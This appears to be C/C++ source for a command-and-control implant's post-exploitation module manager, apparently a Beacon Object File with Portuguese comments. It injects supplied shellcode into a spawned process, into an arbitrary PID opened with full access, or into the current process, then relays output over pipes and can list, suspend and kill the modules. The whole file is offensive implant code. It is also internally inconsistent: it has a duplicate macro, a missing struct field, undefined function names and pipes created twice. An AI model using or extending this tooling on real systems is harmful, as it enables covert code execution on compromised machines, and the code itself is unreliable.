#include <kit/kit_process_creation.cc>
#include <kit/kit_spawn_inject.cc>
#include <kit/kit_explicit_inject.cc>

// ==================== PROTOCOL ====================

#define POSTEX_LIST_HANDLE      "\x7f\x3a\x9c\xe1\x4b\x8d\x2f\xa6"
#define POSTEX_COUNT_HANDLE     "\x8e\x4b\x2d\xf7\x5c\x9a\x3e\xb1"

#define PIPE_MAGIC              0xDEADF00D
#define PIPE_BUFFER_SIZE        0x10000

// Beacon -> Module
#define CMD_RESUME              0x01
#define CMD_SUSPEND             0x02
#define CMD_KILL                0x03

// Module -> Beacon
#define MSG_READY               0x10
#define MSG_COMPLETE            0x11
#define MSG_STATE               0x12

// Estados
#define STATE_RUNNING           0x01
#define STATE_SUSPENDED         0x02
#define STATE_COMPLETED         0x03
#define STATE_DEAD              0x04

#pragma pack(push, 1)

// Beacon -> Module
typedef struct _PIPE_CMD {
    UINT32 magic;
    UINT32 cmd;
} PIPE_CMD, *PPIPE_CMD;

// Module -> Beacon (estruturado)
typedef struct _PIPE_MSG {
    UINT32 magic;
    UINT32 type;
    UINT32 value;       // exit_code ou state
} PIPE_MSG, *PPIPE_MSG;

#pragma pack(pop)

// ==================== POSTEX ====================

#define POSTEX_METHOD_INLINE    0x000
#define POSTEX_METHOD_EXPLICIT  0x100
#define POSTEX_METHOD_SPAWN     0x200

#define POSTEX_LIST_HANDLE      (PCCH)0xA7F3C9D14E2B8F6A
#define POSTEX_MAX_FAILURES     3

typedef struct _POSTEX_OBJECT {
    struct _POSTEX_OBJECT* next;
    struct _POSTEX_OBJECT* prev;

    UINT32 id;
    UINT32 method;
    UINT32 state;

    HANDLE pipe_read;
    HANDLE pipe_write;
    HANDLE process_handle;
    HANDLE thread_handle;

    UINT8  failures;
} POSTEX_OBJECT, *PPOSTEX_OBJECT;

typedef struct _POSTEX_LIST {
    PPOSTEX_OBJECT head;
    PPOSTEX_OBJECT tail;
    UINT32         count;
    UINT32         next_id;
} POSTEX_LIST, *PPOSTEX_LIST;

// ==================== LIST ====================

PPOSTEX_LIST PostexListGet() {
    PPOSTEX_LIST list = (PPOSTEX_LIST)BeaconGetValue(POSTEX_LIST_HANDLE);
    
    if (!list) {
        list = (PPOSTEX_LIST)malloc(sizeof(POSTEX_LIST));
        if (list) {
            memset(list, 0, sizeof(POSTEX_LIST));
            list->next_id = 1;
            BeaconAddValue(POSTEX_LIST_HANDLE, list);
        }
    }
    
    return list;
}

PPOSTEX_OBJECT PostexFind(UINT32 id) {
    PPOSTEX_LIST list = PostexListGet();
    for (PPOSTEX_OBJECT obj = list->head; obj; obj = obj->next) {
        if (obj->id == id) return obj;
    }
    return nullptr;
}

void PostexAdd(PPOSTEX_OBJECT obj) {
    PPOSTEX_LIST list = PostexListGet();
    
    obj->id   = list->next_id++;
    obj->next = nullptr;
    obj->prev = list->tail;

    if (list->tail) list->tail->next = obj;
    else            list->head = obj;
    
    list->tail = obj;
    list->count++;
}

void PostexRemove(PPOSTEX_OBJECT obj) {
    PPOSTEX_LIST list = PostexListGet();

    if (obj->prev) obj->prev->next = obj->next;
    else           list->head = obj->next;

    if (obj->next) obj->next->prev = obj->prev;
    else           list->tail = obj->prev;

    list->count--;
}

void PostexCleanup(PPOSTEX_OBJECT obj) {
    if (obj->pipe_read)      { CloseHandle(obj->pipe_read);      obj->pipe_read      = nullptr; }
    if (obj->pipe_write)     { CloseHandle(obj->pipe_write);     obj->pipe_write     = nullptr; }
    if (obj->thread_handle)  { CloseHandle(obj->thread_handle);  obj->thread_handle  = nullptr; }
    if (obj->process_handle) { CloseHandle(obj->process_handle); obj->process_handle = nullptr; }
}

void PostexDestroy(PPOSTEX_OBJECT obj) {
    PostexRemove(obj);
    PostexCleanup(obj);
    free(obj);
}

PPOSTEX_OBJECT PostexCreate(UINT32 method) {
    PPOSTEX_OBJECT obj = (PPOSTEX_OBJECT)malloc(sizeof(POSTEX_OBJECT));
    if (!obj) return nullptr;

    memset(obj, 0, sizeof(POSTEX_OBJECT));
    obj->method = method;
    obj->state  = STATE_RUNNING;

    return obj;
}

// ==================== PIPE ====================

BOOL PostexSendCmd(PPOSTEX_OBJECT obj, UINT32 cmd) {
    if (!obj || !obj->pipe_write) return FALSE;

    PIPE_CMD pkt = { .magic = PIPE_MAGIC, .cmd = cmd };

    DWORD written;
    return WriteFile(obj->pipe_write, &pkt, sizeof(pkt), &written, nullptr);
}

void PostexReadOutput(PPOSTEX_OBJECT obj) {
    if (!obj || !obj->pipe_read) return;

    DWORD available = 0;
    if (!PeekNamedPipe(obj->pipe_read, nullptr, 0, nullptr, &available, nullptr) || available == 0) {
        return;
    }

    PBYTE buffer = (PBYTE)malloc(available);
    if (!buffer) return;

    DWORD bytesRead;
    if (!ReadFile(obj->pipe_read, buffer, available, &bytesRead, nullptr) || bytesRead == 0) {
        free(buffer);
        return;
    }

    obj->failures = 0;

    // Checar se é mensagem estruturada (magic no início)
    if (bytesRead >= sizeof(PIPE_MSG)) {
        PPIPE_MSG msg = (PPIPE_MSG)buffer;
        
        if (msg->magic == PIPE_MAGIC) {
            // Mensagem estruturada
            switch (msg->type) {
                case MSG_READY:
                    obj->state = STATE_RUNNING;
                    BeaconPrintfW(CALLBACK_OUTPUT, L"[%d] ready", obj->id);
                    break;

                case MSG_COMPLETE:
                    obj->state = STATE_COMPLETED;
                    BeaconPrintfW(CALLBACK_OUTPUT, L"[%d] complete (exit: %d)", obj->id, msg->value);
                    break;

                case MSG_STATE:
                    obj->state = msg->value;
                    break;
            }

            // Se tem mais dados após o header, é output
            if (bytesRead > sizeof(PIPE_MSG)) {
                BeaconOutput(CALLBACK_OUTPUT, (char*)(buffer + sizeof(PIPE_MSG)), bytesRead - sizeof(PIPE_MSG));
            }

            free(buffer);
            return;
        }
    }

    // Sem magic = output raw, manda tudo
    BeaconOutput(CALLBACK_OUTPUT, (char*)buffer, bytesRead);
    free(buffer);
}

// ==================== POLLING ====================

void PostexCheckAlive(PPOSTEX_OBJECT obj) {
    if (obj->process_handle) {
        DWORD exit_code;
        if (GetExitCodeProcess(obj->process_handle, &exit_code) && exit_code != STILL_ACTIVE) {
            obj->state = STATE_COMPLETED;
        }
    }

    if (obj->thread_handle) {
        DWORD exit_code;
        if (GetExitCodeThread(obj->thread_handle, &exit_code) && exit_code != STILL_ACTIVE) {
            obj->state = STATE_COMPLETED;
        }
    }
}

UINT32 PostexPoll() {
    PPOSTEX_LIST list = PostexListGet();
    
    PPOSTEX_OBJECT obj = list->head;
    while (obj) {
        PPOSTEX_OBJECT next = obj->next;

        PostexReadOutput(obj);
        PostexCheckAlive(obj);

        if (obj->state == STATE_COMPLETED || obj->state == STATE_DEAD) {
            // Ler output restante antes de destruir
            PostexReadOutput(obj);
            PostexDestroy(obj);
        }

        obj = next;
    }

    return list->count;
}

// ==================== COMMANDS ====================

BOOL PostexSuspend(UINT32 id) {
    PPOSTEX_OBJECT obj = PostexFind(id);
    if (!obj) return FALSE;

    if (PostexSendCmd(obj, CMD_SUSPEND)) {
        obj->state = STATE_SUSPENDED;
        return TRUE;
    }
    return FALSE;
}

BOOL PostexResume(UINT32 id) {
    PPOSTEX_OBJECT obj = PostexFind(id);
    if (!obj) return FALSE;

    if (PostexSendCmd(obj, CMD_RESUME)) {
        obj->state = STATE_RUNNING;
        return TRUE;
    }
    return FALSE;
}

BOOL PostexKill(UINT32 id) {
    PPOSTEX_OBJECT obj = PostexFind(id);
    if (!obj) return FALSE;

    PostexSendCmd(obj, CMD_KILL);

    if (obj->process_handle) TerminateProcess(obj->process_handle, 0);
    if (obj->thread_handle)  TerminateThread(obj->thread_handle, 0);

    PostexDestroy(obj);
    return TRUE;
}

void PostexKillAll() {
    PPOSTEX_LIST list = PostexListGet();

    while (list->head) {
        PPOSTEX_OBJECT obj = list->head;
        
        PostexSendCmd(obj, CMD_KILL);
        if (obj->process_handle) TerminateProcess(obj->process_handle, 0);
        if (obj->thread_handle)  TerminateThread(obj->thread_handle, 0);
        
        PostexDestroy(obj);
    }
}

void PostexListAll() {
    PPOSTEX_LIST list = PostexListGet();

    if (list->count == 0) {
        BeaconPrintfW(CALLBACK_OUTPUT, L"no active modules");
        return;
    }

    for (PPOSTEX_OBJECT obj = list->head; obj; obj = obj->next) {
        const wchar_t* method = L"?";
        const wchar_t* state  = L"?";

        switch (obj->method) {
            case POSTEX_METHOD_INLINE:   method = L"INLINE";   break;
            case POSTEX_METHOD_EXPLICIT: method = L"EXPLICIT"; break;
            case POSTEX_METHOD_SPAWN:    method = L"SPAWN";    break;
        }

        switch (obj->state) {
            case STATE_RUNNING:   state = L"RUNNING";   break;
            case STATE_SUSPENDED: state = L"SUSPENDED"; break;
            case STATE_COMPLETED: state = L"COMPLETED"; break;
            case STATE_DEAD:      state = L"DEAD";      break;
        }

        BeaconPrintfW(CALLBACK_OUTPUT, L"[%d] %s %s", obj->id, method, state);
    }
}

BOOL PostexCreatePipes(PPOSTEX_OBJECT obj, PHANDLE module_read, PHANDLE module_write) {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };

    HANDLE b2m_read, b2m_write;  // beacon -> module (commands)
    HANDLE m2b_read, m2b_write;  // module -> beacon (output)

    if ( ! CreatePipe( &b2m_read, &b2m_write, &sa, PIPE_BUFFER_SIZE ) ) {
        return FALSE;
    }

    if ( ! CreatePipe( &m2b_read, &m2b_write, &sa, PIPE_BUFFER_SIZE ) ) {
        CloseHandle(b2m_read);
        CloseHandle(b2m_write);
        return FALSE;
    }

    // Beacon
    obj->pipe_write = b2m_write;
    obj->pipe_read  = m2b_read;

    SetHandleInformation(b2m_write, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(m2b_read,  HANDLE_FLAG_INHERIT, 0);

    // Module
    *module_read  = b2m_read;
    *module_write = m2b_write;

    return TRUE;
}

BOOL PostexSpawn(PBYTE shellcode, INT32 size, PPOSTEX_OBJECT obj) {
    HANDLE module_read, module_write;

    if ( ! PostexCreatePipes( obj, &module_read, &module_write )) {
        return FALSE;
    }

    PS_CREATE_ARGS args = { .state = CREATE_SUSPENDED };

    BOOL ok = SpawnInjection( shellcode, size, nullptr, &args );

    CloseHandle( module_read  );
    CloseHandle( module_write );

    return ok;
}

BOOL PostexExplicit( UINT32 pid, PBYTE shellcode, INT32 size, PPOSTEX_OBJECT obj ) {
    obj->process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if ( ! obj->process_handle ) return FALSE;

    HANDLE module_read, module_write;
    if ( ! PostexCreatePipes( obj, &module_read, &module_write )) {
        return FALSE;
    }

    HANDLE remote_read, remote_write;
    DuplicateHandle( GetCurrentProcess(), module_read,  obj->process_handle, &remote_read,  0, FALSE, DUPLICATE_SAME_ACCESS );
    DuplicateHandle( GetCurrentProcess(), module_write, obj->process_handle, &remote_write, 0, FALSE, DUPLICATE_SAME_ACCESS );

    CloseHandle( module_read  );
    CloseHandle( module_write );

    return ExplicitInjection((INT64)obj->process_handle, shellcode, size, nullptr);
}

BOOL PostexInline( PBYTE shellcode, INT32 size, PPOSTEX_OBJECT obj ) {
    HANDLE module_read, module_write;

    if ( ! PostexCreatePipes( obj, &module_read, &module_write ) ) {
        return FALSE;
    }

    BOOL ok = ExplicitInjection( (INT64)nt_current_process(), shellcode, size, nullptr );

    CloseHandle( module_read  );
    CloseHandle( module_write );

    return ok;
}

extern "C" void go_inject(char* args, int argc) {
    datap parser = {0};
    BeaconDataParse(&parser, args, argc);

    UINT32 method = BeaconDataInt(&parser);
    UINT32 pid    = BeaconDataInt(&parser);
    INT32  sc_len = 0;
    PBYTE  sc     = (PBYTE)BeaconDataExtract(&parser, &sc_len);

    // cria objeto
    PPOSTEX_OBJECT obj = (PPOSTEX_OBJECT)malloc(sizeof(POSTEX_OBJECT));
    memset(obj, 0, sizeof(POSTEX_OBJECT));
    obj->method = method;
    obj->pid    = pid;
    obj->state  = STATE_RUNNING;

    // cria pipes
    HANDLE child_read, child_write;
    if (!PostexCreatePipes(obj, &child_read, &child_write)) {
        BeaconPrintf(CALLBACK_ERROR, "failed to create pipes");
        free(obj);
        return;
    }

    // injeta conforme método
    BOOL ok = FALSE;
    switch (method) {
        case POSTEX_METHOD_INLINE:
            ok = PostexInjectInline(sc, sc_len, obj);
            break;
        case POSTEX_METHOD_SPAWN:
            ok = PostexInjectSpawn(sc, sc_len, obj);
            break;
        case POSTEX_METHOD_EXPLICIT:
            ok = PostexInjectExplicit(pid, sc, sc_len, obj);
            break;
    }

    if (ok) {
        PostexAdd(obj);
        BeaconPrintf(CALLBACK_OUTPUT, "[postex-%d] started (method=%d, pid=%d)", 
                     obj->id, method, pid);
    } else {
        PostexCleanupHandles(obj);
        free(obj);
        BeaconPrintf(CALLBACK_ERROR, "injection failed");
    }

    CloseHandle(child_read);
    CloseHandle(child_write);
}

extern "C" void go_poll(char* args, int argc) {
    PPOSTEX_LIST list = PostexListGet();
    
    PPOSTEX_OBJECT obj = list->head;
    while ( obj ) {
        PPOSTEX_OBJECT next = obj->next;

        PostexReadOutput( obj );
        
        PostexCheckAlive( obj );

        if ( obj->state == STATE_COMPLETED ) {
            PostexReadOutput( obj );  
            BeaconPrintf(CALLBACK_OUTPUT, "[postex-%d] completed", obj->id);
            PostexDestroy( obj );
        }

        obj = next;
    }

    // atualiza count para o beacon
    PUINT32 count_ptr = (PUINT32)BeaconGetValue(POSTEX_COUNT_HANDLE);
    if (!count_ptr) {
        count_ptr = (PUINT32)malloc(sizeof(UINT32));
        BeaconAddValue(POSTEX_COUNT_HANDLE, count_ptr);
    }
    *count_ptr = list->count;
}

extern "C" void go_kill(char* args, int argc) {
    datap parser = {0};
    BeaconDataParse(&parser, args, argc);

    UINT32 id = BeaconDataInt(&parser);

    PPOSTEX_OBJECT obj = PostexFind(id);
    if (!obj) {
        BeaconPrintf(CALLBACK_ERROR, "postex %d not found", id);
        return;
    }

    if (obj->process_handle) 
        TerminateProcess(obj->process_handle, 0);
    if (obj->thread_handle)  
        TerminateThread(obj->thread_handle, 0);

    PostexDestroy(obj);
    BeaconPrintf(CALLBACK_OUTPUT, "[postex-%d] killed", id);
}

extern "C" void go_list(char* args, int argc) {
    PPOSTEX_LIST list = PostexListGet();

    if ( list->count == 0 ) {
        BeaconPrintf( CALLBACK_OUTPUT, "no active postex" );
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "ID\tMETHOD\t\tSTATE\t\tPID");
    BeaconPrintf(CALLBACK_OUTPUT, "──\t──────\t\t─────\t\t───");

    for (PPOSTEX_OBJECT obj = list->head; obj; obj = obj->next) {
        char* method_str = "?";
        char* state_str  = "?";

        switch ( obj->method ) {
            case POSTEX_METHOD_INLINE:   method_str = "INLINE";   break;
            case POSTEX_METHOD_SPAWN:    method_str = "SPAWN";    break;
            case POSTEX_METHOD_EXPLICIT: method_str = "EXPLICIT"; break;
        }

        switch ( obj->state ) {
            case STATE_RUNNING:   state_str = "RUNNING";   break;
            case STATE_SUSPENDED: state_str = "SUSPENDED"; break;
            case STATE_COMPLETED: state_str = "COMPLETED"; break;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "%d\t%s\t\t%s\t\t%d", obj->id, method_str, state_str, obj->pid);
    }
}

extern "C" void go_cleanup( char* args, int argc ) {
    PPOSTEX_LIST list = PostexListGet();

    UINT32 killed = 0;
    while ( list->head ) {
        PPOSTEX_OBJECT obj = list->head;
        
        if ( obj->process_handle ) 
            TerminateProcess( obj->process_handle, 0 );
        if ( obj->thread_handle )  
            TerminateThread( obj->thread_handle, 0 );
        
        PostexDestroy( obj );

        killed++;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "cleanup: %d postex killed", killed);
}
